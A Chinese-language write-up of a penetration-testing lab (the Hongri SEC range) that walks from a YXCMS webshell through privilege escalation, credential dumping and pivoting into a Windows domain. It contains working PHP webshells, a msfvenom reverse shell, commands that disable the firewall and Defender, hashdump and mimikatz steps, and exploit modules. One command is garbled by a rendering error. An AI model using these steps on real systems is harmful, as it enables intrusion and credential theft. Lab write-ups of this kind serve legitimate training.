# 红日SEC内网渗透

`chcp 65001`

参考文档

> https://www.ghtwf01.cn/index.php/archives/588/#menu_index_2
>
> https://www.freesion.com/article/84001006807/

首先分析环境

![1.png](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/2078456514.png)

`VM1`是`win7`是`Web`服务器
`VM2`是`windows2003`是域成员
`VM3`是`windows2008`是域控



## 手动配置环境

- kali：NAT模式（192.168.248.129）外网
- win7网络适配器1（192.168.52.143）内网
- win7网络适配器2（192.168.248.128）外网
- win2003（192.168.52.141）内网
- win2008（192.168.52.138）内网

主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy

设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。



## 拿下WebShell

首先访问web，查看环境配置是否正确

![image-20210323113707230](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323113707230.png)



### 目录扫描

上了大型漏扫awvs、Netsparker、zap都没有发现可利用的漏洞，连后台都没有发现（可见不能依赖扫描器），上了几个扫目录的也没有发现后台，

注册一个账号登录后没有找到可利用的地方，观察`url`发现`?r=menber`，猜想管理员登录界面是`?r=admin`，确实是这样，当然已经知道它是`yxcms`所以不存在找不到它的后台

最后可以看到提示：

![image-20210323114120679](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323114120679.png)

进入了后台，开始寻找上传点，准备写入webshell

![image-20210323114353631](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323114353631.png)

**前台模板处可以进行编辑**；**数据库可以执行sql语句**，这两点已经暗示的很明显了，上传文件管理的地方其实不能上传



### 一句话木马拿WebShell

这里我们使用一句话木马，然后通过查找目录泄露查找文件路径

```
<?php eval($_POST['x']);?>
```

![image-20210323123721369](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323123721369.png)

查找到路径，蚁剑连接

```
http://192.168.248.128/yxcms/protected/apps/default/view/default/acomment.php
```

![image-20210323124136903](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323124136903.png)

![image-20210323124200781](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323124200781.png)





### SQL注入拿WebShell

这里再试一下SQL注入拿Webshell，我们用**数据库写日志**的老方法来添加WebShell

```
show variables like "%general%"
set global general_log=on;		# 开启日志  
set global general_log_file='C:/phpStudy/WWW/yxcms/hack.php';		# 设置日志位置为网站目录
select "<?php eval($_POST['a']);?>";
```

![QQ截图20210323133147](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210323133147.png)

![QQ截图20210323133247](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210323133247.png)

![QQ截图20210323133347](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210323133347-1616478149671.png)

![QQ截图20210323133447](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210323133447.png)

![QQ截图20210323133547](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/QQ%E6%88%AA%E5%9B%BE20210323133547.png)

这样我们SQL也成功注入了shell，同样可以连接成功，而且拿到了管理员权限

![image-20210323134539684](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323134539684.png)





### 反弹shell拿到WebShell

为了更好地渗透，我们用**msfvenom**做一个后门，将这个`shell`反弹到`msf`上面，进行利用

这个IP和端口，我们填入Kali的IP地址端口

```
msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.248.129 lport=4444 -f exe X > win7_shell.exe
```

生成`python`反弹`shell`到`msf`马，通过蚁剑上传，虚拟终端执行，`kali`监听，成功反弹到`msf`上

启动Msfconsole，设置监听模块

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.248.129
set LPORT 4444
run
```

![image-20210323140059606](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323140059606.png)



## 权限提升

**首先查看自己的权限情况**

![image-20210323140430738](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323140430738.png)

**查看端口情况**

```
netstat -ano
```

![image-20210323140628380](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323140628380.png)

### 系统信息查询漏洞

查询系统信息，拿去对比漏洞库，保存为123.txt

```
systeminfo
systeminfo > 123.txt
```

首先在kali上运行脚本获得最新的漏洞库

```
./windows-exploit-suggester.py --update
```

把获得的目标安装补丁列表保存进当前目录下

脚本对比出目标系统漏洞

```
./windows-exploit-suggester.py --database 2021-03-21-mssb.xls --systeminfo 123.txt
```



这里也可以使用`post/multi/recon/local_exploit_suggester`模块

```
use post/multi/recon/local_exploit_suggester
set SESSION 填入对应的session号
```

![image-20210323142550083](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323142550083.png)



### 漏洞利用提权

这里挺多漏洞可以利用的，我们找到最需要的`ms16-014`提权漏洞，我们查找一下

```
search ms16-014
```

利用模块提权

```
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION 3
run
```

失败后我们尝试关闭防火墙和 `windefend`

```
netsh advfirewall set allprofiles state off
net stop windefend
```

然后使用`ms16-014`的`exp`打一下没有建立会话

**最后，发现我们拿到`meterpreter`后直接`getsystem`就能拿到系统权限**

```
getsystem
```

![image-20210323143319035](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323143319035.png)





## 信息收集

我们先进行基本信息的收集：在提权成功的情况下，以system的身份来运行下列命令，大部分都有回显，不会报错；

| 命令                                             | 作用                                                         |
| ------------------------------------------------ | ------------------------------------------------------------ |
| **ipconfig /all**                                | **查看本机ip，所在域**                                       |
| **route print**                                  | **打印路由信息**                                             |
| **net view**                                     | **查看局域网内其他主机名**                                   |
| **arp -a**                                       | **查看arp缓存**                                              |
| **net start**                                    | **查看开启了哪些服务**                                       |
| **net share**                                    | **查看开启了哪些共享**                                       |
| net share ipc$                                   | 开启ipc共享                                                  |
| net share c$                                     | 开启c盘共享                                                  |
| net use \\192.168.xx.xx\ipc$ "" /user:""         | 与192.168.xx.xx建立空连接                                    |
| net use \\192.168.xx.xx\c$ "密码" /user:"用户名" | 建立c盘共享                                                  |
| **net config Workstation**                       | **查看计算机名、全名、用户名、系统版本、工作站、域、登录域** |
| **net user**                                     | **查看本机用户列表**                                         |
| **net user /domain**                             | **查看域用户**                                               |
| net localgroup administrators                    | 查看本地管理员组（通常会有域用户）                           |
| **net view /domain**                             | **查看有几个域**                                             |
| net user 用户名 /domain                          | 获取指定域用户的信息                                         |
| net group /domain                                | 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） |
| net group 组名 /domain                           | 查看域中某工作组                                             |
| net group "domain admins" /domain                | 查看域管理员的名字                                           |
| net group "domain computers" /domain             | 查看域中的其他主机名                                         |
| **net group "doamin controllers" /domain**       | **查看域控制器（可能有多台）**                               |

整理一下信息

- **域：**god.org
- **域内有三个用户：**Administrator、ligang、liukaifeng01
- **域内三台主机：**ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA
- **域控：**OWA(192.168.52.138)
- **win7内网ip：**192.168.52.143



### 开启3389端口

使用meterpreter命令`shell`获取shell

使用CMD指令创建用户并进行用户提权
`net user 用户名 密码 /add`
`net localgroup administrators 用户名 /add`
`exit`退出CMD

使用meterpreter命令`run getgui -e`开放3389端口
Kali终端输入`rdesktop IP`进行连接
并使用提权后的管理员登录

```
run getgui -e
```



### hash密码抓取

#### 使用Hashdump抓取密码

在Meterpreter Shell提示符下输入 `hashdump` 命令，将导出目标机sam数据库中的Hash

```
hashdump
```

在非SYSTEM权限下远行 `hashdump` 命令会失败，而且在 Windows7、Windows Server2008下有时候会出现进程移植不成功等问题；而另一个模块 **`smart hashdumpe`** 的功能更为强大，可以导出域所有用户的Hash，其工作流程如下：

- 检查Meterpreter会话的权限和目标机操作系统类型
- 检查目标机是否为域控制服务器
- 首先尝试从注册表中读取Hash，不行的话再尝试注入LSASS进程

这里要注意如果目标机的系统是 Windows7，而目开启了UAC，获取Hash就会失败，这时需要先使用绕过UAC的后渗透攻击模块

```
run windows/gather/smart_hashdump
```



#### 使用Mimikatz抓取密码（新工具kiwi）

**Mimikatz必须在管理员权限下使用**，当前权限为Administrator，输入 `getsystem` 命令获取了系统权限

```
getsystem
```

查看系统情况

```
sysinfo
```

加载kiwi，直接命令查看所有

```
load kiwi
creds_all
```



### 探测域内存活主机

```
run windows/gather/enum_ad_computers
```



### 域控列表

```
run windows/gather/enum_domains
```



### Post 后渗透模块

| 命令                                                  | 作用                                                   |
| ----------------------------------------------------- | ------------------------------------------------------ |
| run post/windows/manage/migrate                       | 自动进程迁移                                           |
| run post/windows/gather/checkvm                       | 查看目标主机是否运行在虚拟机上                         |
| run post/windows/manage/killav                        | 关闭杀毒软件                                           |
| run post/windows/manage/enable_rdp                    | 开启远程桌面服务                                       |
| run post/windows/manage/autoroute                     | 查看路由信息                                           |
| run post/windows/gather/enum_logged_on_users          | 列举当前登录的用户                                     |
| run post/windows/gather/enum_applications             | 列举应用程序                                           |
| run post/windows/gather/credentials/windows_autologin | 抓取自动登录的用户名和密码                             |
| run post/windows/gather/smart_hashdump                | *dump*出所有用户的*hash*                               |
| run getgui -u hack -p 123                             | 有时候无法使用后渗透模块添加用户 可以使用shell自主添加 |



### 添加可以使用的shell用户自主添加

```
net user hack Zyx960706 /add
net localgroup administrator hack /add
netsh advfirewall set allprofiles state off        #关闭防火墙
net stop windefend
```



### 域内存活主机探测（系统、端口）

| 模块                                                         | 作用                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| auxiliary/scanner/discovery/udp_sweep                        | 基于udp协议发现内网存活主机                                  |
| auxiliary/scanner/discovery/udp_probe                        | 基于udp协议发现内网存活主机                                  |
| auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机 | 基于netbios协议发现内网存活主机                              |
| auxiliary/scanner/portscan/tcp                               | 基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活 |



### 端口扫描

端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理

| 模块                           | 作用                                              |
| ------------------------------ | ------------------------------------------------- |
| auxiliary/scanner/portscan/tcp | 基于tcp进行端口扫描(1-10000)                      |
| auxiliary/scanner/portscan/ack | 基于tcp的ack回复进行端口扫描，默认扫描1-10000端口 |



### 服务扫描

| 模块                                         | 作用                                     |
| -------------------------------------------- | ---------------------------------------- |
| auxiliary/scanner/ftp/ftp_version            | 发现内网ftp服务，基于默认21端口          |
| auxiliary/scanner/ssh/ssh_version            | 发现内网ssh服务，基于默认22端口          |
| auxiliary/scanner/telnet/telnet_version      | 发现内网telnet服务，基于默认23端口       |
| auxiliary/scanner/dns/dns_amp                | 发现dns服务，基于默认53端口              |
| auxiliary/scanner/http/http_version          | 发现内网http服务，基于默认80端口         |
| auxiliary/scanner/http/title                 | 探测内网http服务的标题                   |
| auxiliary/scanner/smb/smb_version            | 发现内网smb服务，基于默认的445端口       |
| use auxiliary/scanner/mssql/mssql_schemadump | 发现内网SQLServer服务,基于默认的1433端口 |
| use auxiliary/scanner/oracle/oracle_hashdump | 发现内网oracle服务,基于默认的1521端口    |
| auxiliary/scanner/mysql/mysql_version        | 发现内网mysql服务，基于默认*3306端口*    |
| auxiliary/scanner/rdp/rdp_scanner            | 发现内网RDP服务，基于默认*3389端口*      |
| auxiliary/scanner/redis/redis_server         | 发现内网Redis服务，基于默认6379端口      |
| auxiliary/scanner/db2/db2_version            | 探测内网的db2服务，基于默认的50000端口   |
| auxiliary/scanner/netbios/nbname             | 探测内网主机的netbios名字                |





## 横向内网渗透

### 检测内网设备

探测内网存活的主机，利用ping命令

- Windows

  ```
  for /l %p in (1,1,254) do @ping -l 1 -n 3 -w 40 192.168.52.%p & if errorlevel 1 (echo 192.168.52.%p>>na.txt) else (echo 192.168.1.%p>>ok.txt)
  ```

- Linux

  ```
  for i in {1…254}; do ping -q -i 0.01 -c 3 192.168.164.KaTeX parse error: Expected 'EOF', got '&' at position 3: i &̲> /dev/null && …i is alive; done
  ```



### 添加一条路由

添加一条路由，这里设置的目的是把win7作为跳板机

添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递

```
run autoroute -s 192.168.52.0/24
```

查看一下

```
route print
```

![image-20210323155050311](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323155050311.png)



也就是`192.168.52.129`是跳板机，我们利用`arp -a`查看内网存活主机

```
arp -a
```





### 内网设备端口扫描

我们发现在内网存在`192.168.52.141`设备，我们利用扫描端口模块扫描`192.168.52.141`开放端口

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.52.141
set PORTS 1-9000
set THREADS 100		//设置线程
```

![image-20210323161407035](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323161407035.png)



我们看到这台机器开启了`445`端口，所以利用模块扫描系统版本，扫描结果是`windows2003`

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.52.141
```

![image-20210323161616173](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323161616173.png)







```
use exploit/windows/dcerpc/ms03_026_dcom
set rhosts 192.168.52.141
set LPORT 4445
set payload windows/meterpreter/bind_tcp
run
```



















### 1、搭建代理